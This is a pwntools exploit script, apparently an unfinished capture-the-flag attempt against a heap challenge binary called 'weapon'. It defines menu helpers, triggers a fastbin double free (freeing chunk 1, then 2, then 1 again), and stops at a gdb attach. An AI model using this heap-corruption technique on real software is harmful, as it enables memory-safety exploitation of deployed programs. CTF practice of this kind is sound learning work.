from pwn import *

context(arch='amd64', os='linux')
file_name = './weapon'
debug = 0
if debug:
    p = remote('node4.buuoj.cn', 29991)
    lib = ELF('../../pwn/libc/u16/libc-2.23-64.so')
else:
    p = process(file_name)
    lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')
elf = ELF(file_name)


def choice(id_):
    p.recvuntil(b'>>')
    p.sendline(id_)


def add(size_, id_, mess):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(str(int(size_)))
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.send(mess)


def delete(id_):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)


def edit(id_, mess):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.send(mess)


add(0x10, b'1', b'a')
add(0x10, b'2', b'a')
delete(b'1')
delete(b'2')
delete(b'1')
gdb.attach(p)
p.interactive()
